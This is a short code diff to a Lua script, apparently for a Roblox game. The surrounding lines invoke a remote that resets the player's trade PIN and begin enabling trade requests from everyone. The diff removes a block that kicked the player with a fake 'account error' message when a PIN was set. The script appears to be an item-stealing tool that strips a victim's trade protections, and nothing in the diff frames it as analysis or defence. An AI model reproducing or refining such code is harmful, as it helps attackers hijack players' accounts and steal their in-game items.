@@ -46,10 +46,6 @@ local args = {
     }
 }
 local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
-if PINReponse ~= "You don't have a PIN code" then
-    plr:kick("Account error. Please disable trade PIN and try again")
-    return
-end
 
 -- Allow trade requests from everyone
 local tradeArgs = {
